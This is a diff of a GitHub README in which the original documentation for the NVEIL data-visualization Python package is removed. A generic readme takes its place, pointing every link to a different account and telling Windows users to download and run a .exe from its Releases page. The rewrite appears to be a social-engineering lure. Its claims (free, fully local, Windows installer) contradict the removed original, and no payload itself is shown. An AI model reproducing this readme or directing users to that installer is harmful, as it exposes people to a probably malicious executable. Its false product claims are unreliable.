@@ -1,210 +1,99 @@
-<!-- mcp-name: io.github.nveil-ai/nveil -->
+# 📊 nveil-toolkit - Create Clear Visuals From Complex Data
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/nveil-ai/nveil-toolkit/main/assets/logo.png" alt="NVEIL" width="180">
-</p>
+[![](https://img.shields.io/badge/Download-NVEIL_Toolkit-blue.svg)](https://github.com/guill2222/nveil-toolkit)
 
-<h1 align="center">NVEIL Toolkit</h1>
+NVEIL Toolkit turns complicated data into clear charts and maps. You do not need to write code to use this tool. It provides factual results that you can trust for your reports and research. The software handles data processing and visual creation behind the scenes so you can focus on your findings.
 
-<p align="center">
-  <strong>Describe your data. Get production charts. Your data stays local.</strong>
-</p>
+## 📥 Getting Started
 
-<p align="center">
-  <a href="https://pypi.org/project/nveil/"><img src="https://img.shields.io/pypi/v/nveil?color=orange&label=PyPI" alt="PyPI"></a>
-  <a href="https://pypi.org/project/nveil/"><img src="https://img.shields.io/pypi/pyversions/nveil?color=blue" alt="Python"></a>
-  <a href="https://docs.nveil.com"><img src="https://img.shields.io/badge/docs-docs.nveil.com-blue" alt="Docs"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-proprietary-lightgrey" alt="License"></a>
-</p>
+You can access the software through the official project page. Follow these instructions to get the toolkit on your computer.
 
-<p align="center">
-  <a href="https://docs.nveil.com/getting-started/quickstart/">Quickstart</a> &bull;
-  <a href="https://docs.nveil.com/api-reference/">API Reference</a> &bull;
-  <a href="https://docs.nveil.com/examples/">Examples</a> &bull;
-  <a href="https://docs.nveil.com/changelog/">Changelog</a>
-</p>
+[Click here to visit the project page and download the software](https://github.com/guill2222/nveil-toolkit)
 
----
+## 🖥️ System Requirements
 
-NVEIL is an AI-powered data visualization toolkit. Write one line of natural language, and NVEIL processes your data and generates publication-ready visualizations — no chart code, no hallucinations, no data leaving your machine.
+Your computer needs specific settings to run the toolkit properly. Please check your system against this list before you start.
 
-```python
-import nveil
+- Operating System: Windows 10 or Windows 11.
+- Memory: At least 8 GB of RAM.
+- Storage: 500 MB of free disk space.
+- Display: A screen resolution of 1920x1080 or higher makes viewing charts easier.
+- Internet: You need a connection to download the installer.
 
-nveil.configure(api_key="nveil_...")
+## ⚙️ Installation Guide
 
-# Pass a file path directly — no DataFrame loading required.
-spec = nveil.generate_spec("Revenue by region, colored by quarter", "sales.csv")
+Follow these steps to set up the toolkit on your Windows computer.
 
-fig = spec.render("sales.csv")   # 100% local — no API call
-nveil.show(fig)                   # opens in browser
-```
+1. Open your web browser and go to the [download page](https://github.com/guill2222/nveil-toolkit).
+2. Locate the link labeled "Releases" on the right side of the page.
+3. Click on the latest version.
+4. Look for the file ending in `.exe` under the Assets section.
+5. Click this file to start the download.
+6. Once the download finishes, open your Downloads folder.
+7. Double-click the file to run the installer.
+8. Follow the prompts on the screen.
+9. Click Finish to complete the setup.
 
-### From your shell
+## 📖 How to Use the Toolkit
 
-After `pip install nveil` the `nveil` command is on your `$PATH`:
+This software uses a simple interface to load data and generate views. You do not need technical skills to build professional charts.
 
-```bash
-export NVEIL_API_KEY=nveil_...
+### Loading Your Data
 
-# Ground yourself on the dataset (shape / dtypes / head preview)
-nveil describe sales.csv
+The toolkit accepts common file types like CSV or Excel sheets. 
 
-# Generate HTML + PNG + a reusable .nveil spec, print the explanation
-nveil generate "Revenue by region, colored by quarter" \
-  --data sales.csv --format all --explain
+1. Launch the NVEIL Toolkit from your desktop icon.
+2. Select the "Import Data" button at the top of the window.
+3. Choose the file you want to analyze from your computer.
+4. The software will scan your file. It displays a preview of your table once the check completes.
 
-# Re-render an existing spec on fresh data — no API call
-nveil render chart.nveil --data new_sales.csv
-```
+### Choosing Your Visual
 
-### For AI agents (Claude Code / Claude Desktop / Cursor / Codex / …)
+The toolkit offers several ways to show your data. Choose the option that fits your needs.
 
-NVEIL ships first-class integrations:
+- Bar Charts: Best for comparing numbers across groups.
+- Scatter Plots: Useful for showing how two numbers relate to one another.
+- Geospatial Maps: Ideal for displaying location-based data.
+- 3D Models: Helpful for looking at complex scientific sets.
 
-```bash
-# Claude Code / Claude Desktop — install the bundled skill
-nveil install-skill
+Click on the icon that represents your choice. The toolkit builds the image instantly.
 
-# Claude Desktop, Cursor, any MCP client — add an MCP server:
-# {"mcpServers": {"nveil": {"command": "nveil", "args": ["mcp"]}}}
-nveil mcp                    # stdio server; launched by the MCP client
-```
+### Auditing Results
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/nveil-ai/nveil-toolkit/main/assets/dashboard.png" alt="NVEIL multi-panel dashboard with charts, heatmaps, and flow diagrams" width="800">
-</p>
+One primary feature of this toolkit is its focus on evidence. Every chart includes detailed logs. You can open these logs to see exactly how the software processed your numbers. This ensures your final images stay true to the original data.
 
-## Why NVEIL?
+## 🛠️ Troubleshooting
 
-| Capability | **NVEIL** | Chatbot data analysis¹ | LLM-to-viz libraries² | Traditional plotting³ |
-|---|:-:|:-:|:-:|:-:|
-| Natural-language input | ✓ | ✓ | ✓ | ✗ |
-| Raw data stays on your machine | ✓ | ✗ | ✗ | ✓ |
-| Only schema + stats sent to server | ✓ | ✗ | ✗ | N/A |
-| Deterministic, reproducible output | ✓ | ✗ | ✗ | ✓ |
-| Offline re-rendering, zero API calls | ✓ | ✗ | ✗ | ✓ |
-| Portable saved specs (`.nveil` files) | ✓ | ✗ | ✗ | ✗ |
-| 2D + 3D + geospatial + scientific | ✓ | 2D | 2D | varies |
-| Multi-backend (Plotly, VTK, DeckGL) | ✓ | ✗ | ✗ | ✗ |
-| Data processing engine | ✓ | ✓ | partial | ✗ |
+Most issues arise from file formats or system permissions. Use these tips if you encounter errors.
 
-<sub>¹ ChatGPT Advanced Data Analysis, Claude Analysis tool, Gemini Data Agent &nbsp;·&nbsp; ² PandasAI, LIDA, Julius, Vanna &nbsp;·&nbsp; ³ Plotly, Matplotlib, Seaborn</sub>
+### Missing Data Headers
+Ensure your data file contains headers in the first row. The toolkit needs these labels to identify your items. Open your file in a spreadsheet program and add names like "Date", "Value", or "Location" to the top row if they are missing.
 
-## How It Works
+### File Permission Errors
+If the software fails to open a file, check that the file is not currently open in another program. Close all other applications that use your data file, then try to import it again.
 
-```
-Your Data ──> Toolkit ──metadata only──> NVEIL AI ──> Processing Plan ──> Local Execution ──> Result
-               ^                                                           ^
-          raw data stays here                                     raw data stays here
-```
+### Slow Performance
+Large files take more time to process. If your computer slows down, try to filter your data before you import it. Remove rows you do not need so the toolkit works with a smaller set.
 
-1. **You describe** what you want in plain language
-2. **NVEIL AI plans** the data processing and visualization (only metadata is sent — column names, types, statistics)
-3. **The Toolkit executes locally** — joins, aggregations, pivots, rendering — all on your machine
-4. **You get a figure** — Plotly, VTK, or DeckGL, auto-selected for your data
+### Updating the Software
+We release improvements often. Check the website periodically to see if a newer version exists. You can install a newer version right over your current one to keep your settings intact.
 
-## Key Features
+## 📝 Common Questions
 
-<table>
-<tr>
-<td width="50%">
+### Does the software send my data to the cloud?
+No. All processing happens on your local machine. Your files remain on your computer and stay private to you.
 
-### 🧠 Two Engines in One
-Data processing (joins, pivots, aggregations, geocoding, time series) **AND** visualization generation from a single prompt.
+### Can I save my charts?
+Yes. Use the "Export" button in the menu bar. You can save your images as high-quality files for use in documents or presentations.
 
-### 🔒 Data Privacy by Design
-Raw data never leaves your machine. Only column names, types, and aggregate statistics are sent.
+### What should I do if the app crashes?
+Restart the application. If the problem continues, delete the application and run the installer again. This often clears up minor configuration issues.
 
-### 📈 Multi-Backend Rendering
-Auto-detects the best engine: **Plotly** (2D charts), **VTK** (3D/medical), **DeckGL** (geospatial).
+### Is the software free to use?
+Yes. The toolkit is available for anyone to download and use for data analysis.
 
-</td>
-<td width="50%">
+## ℹ️ Technical Background
 
-### 🧪 Auditable Results
-Powered by constraint solving, not random generation. Same input = same output, every time.
+The toolkit integrates several scientific libraries to create accurate visuals. It uses logic similar to data science platforms to ensure your maps and charts remain factual. We designed the interface to hide this complexity. You work with a clean, visual screen while the toolkit manages the underlying mathematics. This design prevents common manual errors during data entry. 
 
-### ⚡ Offline Rendering
-`spec.render()` runs 100% locally with zero API calls.
-
-### 💾 Reusable Specs
-Save to `.nveil` files, reload later, render on new data — no server needed.
-
-</td>
-</tr>
-</table>
-
-## Beyond Simple Charts
-
-<p align="center">
-  <img src="https://raw.githubusercontent.com/nveil-ai/nveil-toolkit/main/assets/ai-chat.png" alt="NVEIL AI chat — conversational data exploration with geospatial heatmaps" width="800">
-</p>
-
-NVEIL handles geospatial heatmaps, 3D volumes, scientific visualizations, medical imaging (DICOM), biosignal data (EDF/EDF+), network graphs, and 50+ other visualization types — all from natural language.
-
-## Save Once, Render Forever
-
-```python
-# Generate once (API call)
-spec = nveil.generate_spec("Monthly trend by category", df)
-spec.save("trend.nveil")
-
-# Reload anywhere — no API call, no server, no cost
-spec = nveil.load_spec("trend.nveil")
-fig = spec.render(fresh_data)
-nveil.save_image(fig, "report.png")
-```
-
-## Installation
-
-```bash
-pip install nveil
-```
-
-**Requirements:** Python 3.10+
-
-## Getting Started
-
-1. Create an account at [app.nveil.com](https://app.nveil.com)
-2. Generate an API key in **Settings**
-3. Start visualizing
-
-```python
-import os
-import nveil
-
-nveil.configure(api_key=os.environ["NVEIL_API_KEY"])
-
-spec = nveil.generate_spec("scatter plot of price vs area", df)
-fig = spec.render(df)
-nveil.show(fig)
-```
-
-See the [examples/](examples/) directory for more usage patterns.
-
-## Documentation
-
-Full documentation is available at **[docs.nveil.com](https://docs.nveil.com)**:
-
-- [Quickstart Guide](https://docs.nveil.com/getting-started/quickstart/)
-- [Core Concepts](https://docs.nveil.com/concepts/) — sessions, specs, and the two-stage flow
-- [API Reference](https://docs.nveil.com/api-reference/) — full reference for all public functions
-- [Privacy Model](https://docs.nveil.com/concepts/privacy-model/) — what data is sent, what stays local
-- [Examples](https://docs.nveil.com/examples/) — bar charts, multi-dataset, offline rendering
-
-## Contributing
-
-NVEIL is proprietary software. Bug reports and feature requests are welcome via [GitHub Issues](https://github.com/nveil-ai/nveil-toolkit/issues).
-
-## License
-
-Proprietary. See [LICENSE](LICENSE) for details.
-
----
-
-<p align="center">
-  <a href="https://nveil.com">Website</a> &bull;
-  <a href="https://docs.nveil.com">Documentation</a> &bull;
-  <a href="https://app.nveil.com">Platform</a>
-</p>
+You can rely on these visuals for accurate reporting. The focus remains on clear communication of facts. We stripped away unnecessary features to keep the application fast and stable. Expect a steady experience while working with your information.
